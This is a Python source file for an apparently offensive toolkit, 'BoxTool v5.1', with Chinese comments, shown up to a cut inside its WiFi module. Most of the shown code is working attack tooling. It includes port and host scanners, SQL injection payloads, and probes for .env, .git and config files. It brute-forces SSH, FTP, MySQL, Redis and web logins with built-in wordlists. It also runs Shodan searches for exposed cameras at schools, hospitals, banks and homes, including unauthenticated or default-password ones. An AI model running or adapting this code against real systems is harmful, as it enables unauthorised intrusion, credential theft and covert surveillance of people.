#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
BoxTool v5.1 - 核心引擎模块
商业级纯 Python 实现 - 无外部工具依赖
所有功能可在 APK 中独立运行
"""
import os, sys, socket, threading, queue, time, hashlib, base64, random, string, json, re
import struct, ipaddress, ssl, subprocess
from datetime import datetime
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import quote, unquote, urlparse, urljoin, parse_qs, urlencode
import ftplib, smtplib

# 禁用 SSL 警告
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============== 依赖检查 ==============
try:
    import requests
    from requests.auth import HTTPBasicAuth
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False
    print("[!] 警告：requests 未安装，部分功能不可用")

try:
    import paramiko
    HAS_PARAMIKO = True
except ImportError:
    HAS_PARAMIKO = False

try:
    from bs4 import BeautifulSoup
    HAS_BS4 = True
except ImportError:
    HAS_BS4 = False

try:
    import pymysql
    HAS_MYSQL = True
except ImportError:
    HAS_MYSQL = False

try:
    import redis
    HAS_REDIS = True
except ImportError:
    HAS_REDIS = False

try:
    import dns.resolver
    HAS_DNS = True
except ImportError:
    HAS_DNS = False

try:
    import whois
    HAS_WHOIS = True
except ImportError:
    HAS_WHOIS = False

try:
    import shodan
    HAS_SHODAN = True
except ImportError:
    HAS_SHODAN = False

SHODAN_API_KEY = ""

# ============== 工具函数 ==============
def log(msg, level="INFO"):
    ts = datetime.now().strftime("%H:%M:%S")
    print(f"[{ts}] [{level}] {msg}")

def get_headers():
    """获取随机化请求头"""
    import random
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    ]
    return {
        'User-Agent': random.choice(user_agents),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'close',
    }

# ============== 模块 1: 侦察信息收集 ==============
class ReconModule:
    """侦察信息收集模块 - 商业级实现"""

    @staticmethod
    def whois_lookup(domain):
        """Whois 查询 - 真实域名注册信息"""
        if not HAS_WHOIS:
            return "[!] python-whois 未安装，请运行：pip install python-whois"
        if not domain:
            return "[!] 请输入域名"
        try:
            w = whois.whois(domain)
            result = []
            result.append("=" * 60)
            result.append(f"Whois 查询结果：{domain}")
            result.append("=" * 60)
            for k, v in w.items():
                if v:
                    if isinstance(v, list):
                        v = ", ".join(str(i) for i in v[:3])
                    result.append(f"{k}: {v}")
            return "\n".join(result)
        except Exception as e:
            return f"Whois 查询失败：{str(e)}"

    @staticmethod
    def dns_collect(domain):
        """DNS 收集 - A/AAAA/MX/NS/TXT/CNAME 记录"""
        if not HAS_DNS:
            return "[!] dnspython 未安装，请运行：pip install dnspython"
        results = []
        record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'CNAME', 'SOA']
        for rtype in record_types:
            try:
                answers = dns.resolver.resolve(domain, rtype)
                for rdata in answers:
                    results.append(f"[{rtype}] {rdata}")
            except Exception:
                pass
        return "\n".join(results) if results else "[-] 无 DNS 记录"

    @staticmethod
    def subdomain_enum(domain, wordlist_path=None):
        """子域名枚举 - 暴力破解"""
        results = []
        subdomains = [
            'www', 'mail', 'ftp', 'admin', 'blog', 'dev', 'test', 'm', 'api',
            'staging', 'prod', 'web', 'app', 'mobile', 'cdn', 'static',
            'login', 'portal', 'secure', 'vpn', 'remote', 'cloud'
        ]
        if wordlist_path and os.path.exists(wordlist_path):
            with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                subdomains = [l.strip() for l in f if l.strip()][:100]
        
        found_count = 0
        for sub in subdomains:
            target = f"{sub}.{domain}"
            try:
                ip = socket.gethostbyname(target)
                results.append(f"[+] {target} -> {ip}")
                found_count += 1
            except:
                pass
        return f"找到 {found_count} 个子域名:\n" + "\n".join(results) if results else "[-] 未找到子域名"

    @staticmethod
    def port_scan(target, ports=None, timeout=1):
        """端口扫描 - 真实 TCP 连接测试"""
        if not target:
            return "[!] 请输入目标 IP 或域名"
        if ports is None:
            ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 465, 587, 993, 995, 
                    1433, 1521, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 9200, 27017]
        open_ports = []
        
        def scan_port(port):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(timeout)
                result = s.connect_ex((target, port))
                s.close()
                return port if result == 0 else None
            except:
                return None
        
        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = {executor.submit(scan_port, port): port for port in ports}
            for future in as_completed(futures):
                result = future.result()
                if result:
                    open_ports.append(result)
        
        service_map = {
            21: 'FTP', 22: 'SSH', 23: 'TELNET', 25: 'SMTP', 53: 'DNS',
            80: 'HTTP', 110: 'POP3', 143: 'IMAP', 443: 'HTTPS',
            3306: 'MySQL', 3389: 'RDP', 5432: 'PostgreSQL',
            6379: 'Redis', 8080: 'HTTP-ALT', 9200: 'Elasticsearch'
        }
        result_lines = [f"端口 {p} ({service_map.get(p, 'UNKNOWN')}) 开放" for p in sorted(open_ports)]
        return f"扫描 {target}，开放 {len(open_ports)} 个端口:\n" + "\n".join(result_lines)


# ============== 模块 2: 专业扫描 ==============
class ScanModule:
    """专业扫描模块 - 纯 Python 实现"""

    @staticmethod
    def alive_scan(ip_range, timeout=1):
        """存活扫描 - 检测存活主机"""
        alive = []
        try:
            net = ipaddress.ip_network(ip_range, strict=False)
            def ping_host(ip):
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(timeout)
                    s.connect((str(ip), 80))
                    s.close()
                    return str(ip)
                except:
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(timeout)
                        s.connect((str(ip), 445))
                        s.close()
                        return str(ip)
                    except:
                        return None
            with ThreadPoolExecutor(max_workers=100) as ex:
                futures = {ex.submit(ping_host, ip): ip for ip in net}
                for f in as_completed(futures):
                    r = f.result()
                    if r:
                        alive.append(r)
        except Exception as e:
            return f"扫描失败：{str(e)}"
        return f"存活主机 {len(alive)} 台:\n" + "\n".join(alive) if alive else "[-] 未发现存活主机"

    @staticmethod
    def fast_scan(target, top_ports=20):
        """快速端口扫描 - 常用端口"""
        ports = [21, 22, 80, 443, 445, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 9200, 27017]
        return ReconModule.port_scan(target, ports, timeout=2)

    @staticmethod
    def full_scan(target):
        """全端口扫描 - 1-10000"""
        ports = list(range(1, 10001))
        return ReconModule.port_scan(target, ports, timeout=0.3)

    @staticmethod
    def vuln_scan(target, ports=None):
        """漏洞扫描 - 服务版本检测"""
        if ports is None:
            ports = [21, 22, 80, 443, 3306, 3389, 8080]
        results = []
        for port in ports:
            try:
                s = socket.socket()
                s.settimeout(2)
                s.connect((target, port))
                # 尝试获取 banner
                s.send(b"\r\n")
                s.settimeout(1)
                try:
                    banner = s.recv(1024).decode('utf-8', errors='ignore').strip()
                    if banner:
                        results.append(f"端口 {port} - Banner: {banner[:100]}")
                    else:
                        results.append(f"端口 {port} - 需进一步漏洞检测")
                except:
                    results.append(f"端口 {port} - 需进一步漏洞检测")
                s.close()
            except:
                pass
        return "\n".join(results) if results else "[-] 无开放端口"


# ============== 模块 3: Web 渗透测试 ==============
class WebModule:
    """Web 渗透测试模块 - 纯 Python 实现"""

    # 敏感文件路径
    SENSITIVE_FILES = [
        'robots.txt', 'sitemap.xml', 'admin/', 'wp-admin/', 'administrator/',
        '.git/config', '.git/HEAD', '.env', 'config.php', 'wp-config.php',
        'backup.zip', 'database.sql', 'phpinfo.php', 'info.php',
        'web.config', '.htaccess', 'crossdomain.xml', 'clientaccesspolicy.xml',
    ]

    # WAF 特征
    WAF_SIGNATURES = {
        'Cloudflare': ['cf-ray', 'cf-cache-status', 'cloudflare'],
        'Akamai': ['akamai', 'x-akamai'],
        'AWS WAF': ['aws', 'x-amz'],
        'Incapsula': ['incap_ses', 'visid_incap'],
        'FortiWeb': ['fortiweb', 'fwebid'],
        'ModSecurity': ['mod_security', 'modsecurity'],
        'Imperva': ['imperva', 'x-cdn'],
        '360WangZhanBao': ['360wzb', 'wangzhanbao'],
        '阿里云 WAF': ['aliyun', 'alibaba'],
        '腾讯云 WAF': ['tencent', 'qq.com'],
    }

    @staticmethod
    def sqlmap_scan(url, level=1, risk=1):
        """SQLMap 扫描 - 纯 Python 实现基础 SQL 注入检测"""
        if not HAS_REQUESTS:
            return "[!] requests 未安装"
        
        results = []
        results.append("=" * 60)
        results.append(f"SQL 注入检测：{url}")
        results.append("=" * 60)
        
        # 解析 URL 参数
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        # SQL 注入 Payload
        payloads = [
            ("' OR '1'='1", "Boolean Based"),
            ("' UNION SELECT NULL-- -", "UNION Based"),
            ("1 AND 1=1", "Simple"),
            ("admin'--", "Comment"),
            ("' AND SLEEP(5)--", "Time Based"),
        ]
        
        # 错误特征
        sql_errors = [
            'sql syntax', 'mysql_fetch', 'ORA-', 'postgresql',
            'sqlite3', 'warning.*mysql', 'odbc', 'jdbc'
        ]
        
        if not params:
            # 尝试常见参数
            for param in ['id', 'page', 'search', 'query', 'user', 'cat']:
                for payload, name in payloads[:3]:
                    test_url = f"{url}?{param}=1{payload}"
                    try:
                        r = requests.get(test_url, timeout=10, headers=get_headers(), verify=False)
                        if any(err in r.text.lower() for err in sql_errors):
                            results.append(f"[+] SQL 注入 ({name}) - 参数：{param}")
                    except Exception as e:
                        pass
        else:
            # 已有参数，测试注入
            for param in params.keys():
                for payload, name in payloads[:3]:
                    test_params = params.copy()
                    test_params[param] = [payload]
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
                    try:
                        r = requests.get(test_url, timeout=10, headers=get_headers(), verify=False)
                        if any(err in r.text.lower() for err in sql_errors):
                            results.append(f"[+] SQL 注入 ({name}) - 参数：{param}")
                    except:
                        pass
        
        if len(results) > 3:
            return "\n".join(results)
        return "[-] 未发现 SQL 注入点"

    @staticmethod
    def sensitive_file_check(url):
        """敏感文件检测 - 真实 HTTP 请求"""
        if not HAS_REQUESTS:
            return "[!] requests 未安装"
        
        found = []
        base_url = url.rstrip('/')
        
        for path in WebModule.SENSITIVE_FILES:
            try:
                full_url = f"{base_url}/{path}"
                r = requests.get(full_url, timeout=5, headers=get_headers(), verify=False)
                if r.status_code == 200 and len(r.text) > 50:
                    found.append(f"[200] {path} (长度：{len(r.text)})")
                elif r.status_code in [301, 302]:
                    location = r.headers.get('location', '')
                    found.append(f"[{r.status_code}] {path} -> {location}")
                elif r.status_code == 403:
                    found.append(f"[403] {path} (禁止访问)")
            except:
                pass
        
        if found:
            return f"发现 {len(found)} 个敏感文件:\n" + "\n".join(found)
        return "[-] 未发现敏感文件"

    @staticmethod
    def waf_detection(url):
        """WAF 检测 - 真实特征识别"""
        if not HAS_REQUESTS:
            return "[!] requests 未安装"
        
        try:
            r = requests.get(url, timeout=10, headers=get_headers(), verify=False, allow_redirects=False)
            headers = {k.lower(): v.lower() for k, v in r.headers.items()}
            html = r.text.lower()
            
            detected = []
            for waf, signatures in WebModule.WAF_SIGNATURES.items():
                for sig in signatures:
                    if sig in html or sig in str(headers):
                        detected.append(waf)
                        break
            
            # 检测响应码异常
            if r.status_code == 405 or (r.status_code >= 400 and 'blocked' in html):
                detected.append("可能存在的 WAF (响应异常)")
            
            if detected:
                return f"WAF 检测到：{', '.join(detected)}"
            return "[-] 未检测到 WAF"
        except Exception as e:
            return f"WAF 检测失败：{str(e)}"

    @staticmethod
    def dir_scanner(url, wordlist=None):
        """目录扫描 - 纯 Python 实现"""
        if not HAS_REQUESTS:
            return "[!] requests 未安装"
        
        paths = wordlist or [
            'admin', 'login', 'upload', 'backup', 'config',
            'api', 'v1', 'v2', 'test', 'dev', 'staging',
            'wp-content', 'wp-includes', 'images', 'files',
        ]
        
        found = []
        base_url = url.rstrip('/')
        
        for path in paths:
            try:
                target = f"{base_url}/{path}"
                r = requests.get(target, timeout=5, headers=get_headers(), verify=False)
                if r.status_code == 200:
                    found.append(f"[200] {path}")
                elif r.status_code in [301, 302]:
                    found.append(f"[{r.status_code}] {path} -> {r.headers.get('location', '')}")
            except:
                pass
        
        return f"发现 {len(found)} 个目录:\n" + "\n".join(found) if found else "[-] 未发现目录"


# ============== 模块 4: 密码爆破 ==============
class BruteModule:
    """密码爆破模块 - 纯 Python 实现，自动使用内置字典"""
    
    # 内置字典路径（自动检测）
    @staticmethod
    def _get_dict_path():
        """自动获取内置字典路径"""
        # 可能的字典位置
        possible_paths = [
            os.path.join(os.path.dirname(__file__), 'wordlists', 'top_passwords.txt'),
            os.path.join(os.getcwd(), 'wordlists', 'top_passwords.txt'),
            os.path.join(os.path.dirname(__file__), '..', 'wordlists', 'top_passwords.txt'),
        ]
        for path in possible_paths:
            if os.path.exists(path):
                return path
        return None
    
    @staticmethod
    def _get_username_dict():
        """获取内置用户名字典"""
        possible_paths = [
            os.path.join(os.path.dirname(__file__), 'wordlists', 'top_usernames.txt'),
            os.path.join(os.getcwd(), 'wordlists', 'top_usernames.txt'),
        ]
        for path in possible_paths:
            if os.path.exists(path):
                with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                    return [l.strip() for l in f if l.strip()][:50]
        return ['root', 'admin', 'user', 'test', 'guest']  # 默认用户名
    
    @staticmethod
    def ssh_bruteforce(host, port, username=None, password_list=None):
        """SSH 爆破 - 自动使用内置字典"""
        if not HAS_PARAMIKO:
            return "[!] paramiko 未安装，请运行：pip install paramiko"
        
        # 自动使用内置字典
        if not password_list or not os.path.exists(password_list):
            dict_path = BruteModule._get_dict_path()
            if not dict_path:
                return "[!] 内置密码字典未找到，请确保 wordlists/top_passwords.txt 存在"
            password_list = dict_path
        
        # 默认用户名
        if not username:
            usernames = BruteModule._get_username_dict()
        else:
            usernames = [username]
        
        success = None
        count = 0
        
        with open(password_list, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = [l.strip() for l in f if l.strip()][:100]
        
        for user in usernames:
            for pwd in passwords:
                try:
                    transport = paramiko.Transport((host, port))
                    try:
                        transport.connect(username=user, password=pwd)
                        success = (user, pwd)
                        transport.close()
                        break
                    except paramiko.AuthenticationException:
                        transport.close()
                    except Exception:
                        break
                    count += 1
                except Exception as e:
                    break
            if success:
                break
        
        if success:
            return f"[+] SSH 爆破成功！用户：{success[0]} 密码：{success[1]}"
        
        for pwd in passwords:
            try:
                transport = paramiko.Transport((host, port))
                try:
                    transport.connect(username=username, password=pwd)
                    success = pwd
                    transport.close()
                    break
                except paramiko.AuthenticationException:
                    transport.close()
                except Exception:
                    break
                count += 1
            except Exception as e:
                break
        
        if success:
            return f"[+] SSH 爆破成功！用户：{username} 密码：{success}"
        return f"[-] SSH 爆破失败，已尝试 {count} 个密码"

    @staticmethod
    def ftp_bruteforce(host, port, username=None, password_list=None):
        """FTP 爆破 - 自动使用内置字典"""
        count = 0
        success = None
        
        # 自动使用内置字典
        if not password_list or not os.path.exists(password_list):
            dict_path = BruteModule._get_dict_path()
            if not dict_path:
                return "[!] 内置密码字典未找到"
            password_list = dict_path
        
        # 默认用户名
        if not username:
            usernames = BruteModule._get_username_dict()
        else:
            usernames = [username]
        
        with open(password_list, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = [l.strip() for l in f if l.strip()][:100]
        
        for user in usernames:
            for pwd in passwords:
                try:
                    ftp = ftplib.FTP()
                    ftp.connect(host, port, timeout=5)
                    ftp.login(user, pwd)
                    success = (user, pwd)
                    ftp.quit()
                    break
                except ftplib.all_errors:
                    pass
                count += 1
            if success:
                break
        
        if success:
            return f"[+] FTP 爆破成功！用户：{success[0]} 密码：{success[1]}"
        return f"[-] FTP 爆破失败，已尝试 {count} 个密码"

    @staticmethod
    def web_login_bruteforce(url, username_field, password_field, username, password_list):
        """Web 登录爆破"""
        if not HAS_REQUESTS:
            return "[!] requests 未安装"
        
        if not os.path.exists(password_list):
            return f"[!] 密码字典不存在：{password_list}"
        
        with open(password_list, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = [l.strip() for l in f if l.strip()][:50]
        
        for pwd in passwords:
            try:
                data = {username_field: username, password_field: pwd}
                r = requests.post(url, data=data, timeout=10, headers=get_headers(), verify=False, allow_redirects=False)
                if r.status_code in [200, 302, 303]:
                    if 'incorrect' not in r.text.lower() and 'wrong' not in r.text.lower() and 'error' not in r.text.lower():
                        return f"[+] Web 登录成功！用户：{username} 密码：{pwd}"
            except:
                pass
        
        return f"[-] Web 登录爆破失败"

    @staticmethod
    def admin_bruteforce(url):
        """后台管理路径发现"""
        if not HAS_REQUESTS:
            return "[!] requests 未安装"
        
        admin_paths = [
            'admin/', 'admin/login/', 'administrator/', 'manage/',
            'backend/', 'control/', 'panel/', 'wp-admin/',
            'login/', 'user/login/', 'auth/', 'signin/'
        ]
        
        found = []
        base_url = url.rstrip('/')
        
        for path in admin_paths:
            try:
                full_url = f"{base_url}/{path}"
                r = requests.get(full_url, timeout=5, headers=get_headers(), verify=False)
                if r.status_code == 200:
                    found.append(full_url)
            except:
                pass
        
        return f"发现后台：{', '.join(found)}" if found else "[-] 未发现后台入口"

    @staticmethod
    def mysql_bruteforce(host, port, username=None, password_list=None):
        """MySQL 爆破 - 自动使用内置字典"""
        if not HAS_MYSQL:
            return "[!] pymysql 未安装，请运行：pip install pymysql"
        
        # 自动使用内置字典
        if not password_list or not os.path.exists(password_list):
            dict_path = BruteModule._get_dict_path()
            if not dict_path:
                return "[!] 内置密码字典未找到"
            password_list = dict_path
        
        # 默认用户名
        if not username:
            usernames = BruteModule._get_username_dict()
        else:
            usernames = [username]
        
        with open(password_list, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = [l.strip() for l in f if l.strip()][:100]
        
        for user in usernames:
            for pwd in passwords:
                try:
                    conn = pymysql.connect(host=host, port=port, user=user, password=pwd, connect_timeout=5)
                    conn.close()
                    return f"[+] MySQL 爆破成功！用户：{user} 密码：{pwd}"
                except:
                    pass
        
        return "[-] MySQL 爆破失败"

    @staticmethod
    def redis_bruteforce(host, port, password_list=None):
        """Redis 爆破 - 自动使用内置字典"""
        if not HAS_REDIS:
            return "[!] redis 未安装，请运行：pip install redis"
        
        # 自动使用内置字典
        if not password_list or not os.path.exists(password_list):
            dict_path = BruteModule._get_dict_path()
            if dict_path:
                with open(dict_path, 'r', encoding='utf-8', errors='ignore') as f:
                    passwords = [''] + [l.strip() for l in f if l.strip()][:50]
            else:
                passwords = ['', 'redis', '123456', 'admin', 'root']
        else:
            with open(password_list, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = [''] + [l.strip() for l in f if l.strip()][:50]
        
        for pwd in passwords:
            try:
                r = redis.Redis(host=host, port=port, password=pwd if pwd else None, socket_timeout=5)
                r.ping()
                return f"[+] Redis 爆破成功！密码：{pwd if pwd else '(无密码)'}"
            except:
                pass
        
        return "[-] Redis 爆破失败"


# ============== 模块 5: Shodan 侦察 ==============
class ShodanModule:
    """Shodan 侦察模块"""

    @staticmethod
    def set_api_key(api_key):
        global SHODAN_API_KEY
        SHODAN_API_KEY = api_key

    @staticmethod
    def ip_info(ip):
        if not SHODAN_API_KEY:
            return "[!] 请先设置 Shodan API Key"
        if not HAS_SHODAN:
            return "[!] shodan 库未安装，请运行：pip install shodan"
        try:
            api = shodan.Shodan(SHODAN_API_KEY)
            host = api.host(ip)
            lines = [
                f"IP: {host['ip_str']}",
                f"国家：{host.get('country_name', 'N/A')}",
                f"城市：{host.get('city', 'N/A')}",
                f"组织：{host.get('org', 'N/A')}",
                f"操作系统：{host.get('os', 'N/A')}",
                f"开放端口：{', '.join(map(str, host['ports']))}"
            ]
            return "\n".join(lines)
        except Exception as e:
            return f"Shodan 查询失败：{str(e)}"

    @staticmethod
    def domain_search(domain):
        return ShodanModule.ip_info(domain)

    @staticmethod
    def keyword_search(query, limit=10):
        if not SHODAN_API_KEY:
            return "[!] 请先设置 Shodan API Key"
        if not HAS_SHODAN:
            return "[!] shodan 库未安装"
        try:
            api = shodan.Shodan(SHODAN_API_KEY)
            results = api.search(query, limit=limit)
            lines = [f"找到 {results['total']} 个结果:"]
            for r in results['matches'][:limit]:
                lines.append(f"IP: {r['ip_str']} | 端口：{r['port']} | 组织：{r.get('org', 'N/A')}")
            return "\n".join(lines)
        except Exception as e:
            return f"搜索失败：{str(e)}"

    @staticmethod
    def vuln_search(vuln_id):
        if not SHODAN_API_KEY:
            return "[!] 请先设置 Shodan API Key"
        try:
            api = shodan.Shodan(SHODAN_API_KEY)
            results = api.search('vuln:' + vuln_id)
            lines = [f"漏洞 {vuln_id} 影响 {results['total']} 台设备:"]
            for r in results['matches'][:10]:
                lines.append(f"IP: {r['ip_str']} | 端口：{r['port']}")
            return "\n".join(lines)
        except Exception as e:
            return f"漏洞搜索失败：{str(e)}"

    @staticmethod
    def geo_search(lat, lon, radius=5):
        if not SHODAN_API_KEY:
            return "[!] 请先设置 Shodan API Key"
        try:
            api = shodan.Shodan(SHODAN_API_KEY)
            results = api.search('geo:' + f"{lat},{lon},{radius}km")
            lines = [f"地理位置 {lat},{lon} 附近 {results['total']} 台设备:"]
            for r in results['matches'][:10]:
                lines.append(f"IP: {r['ip_str']} | {r.get('city','')} | 端口：{r['port']}")
            return "\n".join(lines)
        except Exception as e:
            return f"地理位置搜索失败：{str(e)}"

    @staticmethod
    def camera_search(brand='all', location='', org='', port='', advanced=False):
        """
        摄像头搜索 - 多种搜索模式
        
        参数:
            brand: 品牌/类型 ('all', 'hikvision', 'dahua', 'webcam', 'cctv', 'rtsp' 等)
            location: 地理位置 ('Nanjing', 'Beijing', 'Shanghai' 等)
            org: 组织机构 ('Nanjing University' 等)
            port: 端口过滤 ('80', '554', '8080' 等)
            advanced: 是否使用高级搜索模式
        """
        if not SHODAN_API_KEY:
            return "[!] 请先设置 Shodan API Key"
        if not HAS_SHODAN:
            return "[!] shodan 库未安装，请运行：pip install shodan"
        
        # 摄像头品牌/类型查询规则
        CAMERA_QUERIES = {
            # 品牌摄像头
            'hikvision': 'Server: Hikvision',
            'hikvision-nvr': 'Server: Hikvision NVR',
            'dahua': 'Server: DAHUA',
            'dahua-nvr': 'Server: DAHUA NVR',
            'uniview': 'Server: UNIVIEW',
            'axis': 'Server: Axis',
            'tplink': 'Server: TP-LINK',
            'tp-link': 'Server: TP-LINK',
            'foscam': 'Server: Foscam',
            'hanwha': 'Server: Hanwha',
            'bosch': 'Server: Bosch',
            'sony': 'Server: Sony',
            'panasonic': 'Server: Panasonic',
            'cisco': 'Server: Cisco',
            'huawei': 'Server: Huawei',
            'xiongmai': 'Server: XiongMai',
            'opengear': 'Server: Opengear',
            
            # 通用摄像头类型
            'webcam': 'webcam',
            'webcam-login': 'webcam has_screenshot:true',
            'cctv': 'cctv',
            'ip-camera': 'ip camera',
            'network-camera': 'network camera',
            'surveillance': 'surveillance',
            'security-camera': 'security camera',
            
            # 协议/端口
            'rtsp': 'port:554 rtsp',
            'rtsp-camera': 'port:554 has_screenshot:true',
            'http-camera': 'port:80 has_screenshot:true',
            'http-8080': 'port:8080 has_screenshot:true',
            'onvif': 'onvif',
            
            # 特殊场景
            'traffic': 'traffic camera',
            'street': 'street camera',
            'public': 'public camera',
            'school': 'school camera',
            'hospital': 'hospital camera',
            'bank': 'bank camera',
            'store': 'store camera',
            'home': 'home camera',
            'office': 'office camera',
            
            # 漏洞/未授权
            'unauthorized': 'unauthorized',
            'no-auth': 'authentication disabled',
            'default-password': 'default password',
            'login-page': 'login has_screenshot:true',
        }
        
        try:
            api = shodan.Shodan(SHODAN_API_KEY)
            
            # 构建查询
            if brand == 'all' or brand not in CAMERA_QUERIES:
                # 综合搜索所有摄像头
                query_parts = []
                
                # 添加位置过滤
                if location:
                    query_parts.append(f'city:"{location}"')
                
                # 添加组织过滤
                if org:
                    query_parts.append(f'org:"{org}"')
                
                # 添加端口过滤
                if port:
                    query_parts.append(f'port:{port}')
                
                # 摄像头特征
                camera_filters = [
                    'has_screenshot:true',
                    'Server: Hikvision',
                    'Server: DAHUA',
                    'webcam',
                    'cctv',
                    'ip camera',
                ]
                
                if advanced:
                    # 高级模式：搜索所有可能的摄像头
                    query_parts.append('(' + ' OR '.join(camera_filters[:3]) + ')')
                else:
                    # 普通模式：只搜索有截图的
                    query_parts.append('has_screenshot:true')
                
                query = ' '.join(query_parts)
            else:
                # 使用预设查询
                base_query = CAMERA_QUERIES.get(brand, brand)
                
                # 添加额外过滤
                filters = []
                if location:
                    filters.append(f'city:"{location}"')
                if org:
                    filters.append(f'org:"{org}"')
                if port:
                    filters.append(f'port:{port}')
                
                query = base_query
                if filters:
                    query += ' ' + ' '.join(filters)
            
            # 执行搜索
            results = api.search(query, limit=50)
            
            # 格式化输出
            lines = []
            lines.append("=" * 70)
            lines.append(f"Shodan 摄像头搜索")
            lines.append("=" * 70)
            lines.append(f"搜索查询：{query}")
            lines.append(f"找到 {results['total']} 个结果，显示前 {min(len(results['matches']), 50)} 个")
            lines.append("-" * 70)
            
            # 按城市分组统计
            city_count = {}
            for r in results['matches']:
                city = r.get('city', 'Unknown')
                city_count[city] = city_count.get(city, 0) + 1
            
            if city_count:
                lines.append("\n城市分布:")
                for city, count in sorted(city_count.items(), key=lambda x: x[1], reverse=True)[:10]:
                    lines.append(f"  {city}: {count} 个")
                lines.append("")
            
            lines.append("设备详情:")
            for r in results['matches'][:50]:
                ip = r['ip_str']
                port = r['port']
                city = r.get('city', 'Unknown')
                org = r.get('org', 'Unknown')
                product = r.get('product', 'Unknown')
                timestamp = r.get('timestamp', '')[:10]
                
                line = f"  {ip}:{port}"
                if city != 'Unknown':
                    line += f" | {city}"
                if product != 'Unknown':
                    line += f" | {product}"
                if org and org != 'Unknown':
                    line += f" | {org}"
                lines.append(line)
            
            lines.append("-" * 70)
            lines.append(f"总计：{results['total']} 个设备")
            
            return "\n".join(lines)
            
        except Exception as e:
            return f"摄像头搜索失败：{str(e)}"

    @staticmethod
    def camera_search_by_rules(rule_type='all', location='', org=''):
        """
        按规则类型搜索摄像头
        
        规则类型:
            all: 所有摄像头
            brand: 品牌摄像头
            protocol: 协议类型 (RTSP/ONVIF)
            scene: 场景类型 (交通/学校/银行)
            vuln: 漏洞/未授权
        """
        if not SHODAN_API_KEY:
            return "[!] 请先设置 Shodan API Key"
        
        # 规则分类
        RULES = {
            'brand': [
                ('海康威视', 'Server: Hikvision'),
                ('大华', 'Server: DAHUA'),
                ('宇视', 'Server: UNIVIEW'),
                ('Axis', 'Server: Axis'),
                ('TP-Link', 'Server: TP-LINK'),
            ],
            'protocol': [
                ('RTSP', 'port:554 rtsp'),
                ('ONVIF', 'onvif'),
                ('HTTP', 'port:80 has_screenshot:true'),
            ],
            'scene': [
                ('交通', 'traffic camera'),
                ('学校', 'school camera'),
                ('银行', 'bank camera'),
                ('医院', 'hospital camera'),
                ('商场', 'store camera'),
            ],
            'vuln': [
                ('未授权', 'unauthorized'),
                ('默认密码', 'default password'),
                ('登录页面', 'login has_screenshot:true'),
            ],
        }
        
        try:
            api = shodan.Shodan(SHODAN_API_KEY)
            all_results = []
            
            filters = []
            if location:
                filters.append(f'city:"{location}"')
            if org:
                filters.append(f'org:"{org}"')
            filter_str = ' '.join(filters)
            
            lines = []
            lines.append("=" * 70)
            lines.append(f"Shodan 摄像头分类搜索")
            if location:
                lines.append(f"地区：{location}")
            if org:
                lines.append(f"组织：{org}")
            lines.append("=" * 70)
            
            if rule_type == 'all':
                # 搜索所有类型
                for category, rules in RULES.items():
                    lines.append(f"\n【{category.upper()}】")
                    lines.append("-" * 50)
                    for name, query in rules:
                        full_query = f"{query} {filter_str}".strip()
                        try:
                            result = api.count(full_query)
                            lines.append(f"  {name}: {result.get('total', 0)} 个")
                        except:
                            pass
            else:
                # 搜索指定类型
                if rule_type in RULES:
                    lines.append(f"\n【{rule_type.upper()}】")
                    lines.append("-" * 50)
                    for name, query in RULES[rule_type]:
                        full_query = f"{query} {filter_str}".strip()
                        try:
                            result = api.count(full_query)
                            lines.append(f"  {name}: {result.get('total', 0)} 个")
                        except:
                            pass
            
            return "\n".join(lines)
            
        except Exception as e:
            return f"搜索失败：{str(e)}"


# ============== 模块 6: AI Web 自动化渗透 ==============
# 从 ai_module.py 导入增强版本
try:
    from ai_module import AIModule as AIModule_Enhanced
    AIModule = AIModule_Enhanced
except ImportError:
    # 如果 ai_module.py 不存在，使用基础版本
    class AIModule:
        """AI Web 渗透模块 - 基础版本"""
        @staticmethod
        def info_crawl(url, depth=2):
            return "[!] ai_module.py 未找到，请使用完整版本"
        @staticmethod
        def vuln_scan(url):
            return "[!] ai_module.py 未找到，请使用完整版本"
        @staticmethod
        def auto_pentest(url):
            return "[!] ai_module.py 未找到，请使用完整版本"


# ============== 模块 7: WiFi 渗透测试 ==============
class WifiModule:
    """WiFi 渗透测试模块 - 需要系统工具支持"""

    @staticmethod
    def get_wireless_interfaces():
        """获取无线网卡列表"""
        import platform
        system = platform.system()
        if system == 'Windows':
            return "[i] Windows 系统，请使用 netsh wlan show interfaces"
        elif system == 'Linux':
            try:
                result = subprocess.run(['iwconfig'], capture_output=True, text=True, timeout=5)
                return result.stdout if result.stdout else "[-] 未找到无线网卡"
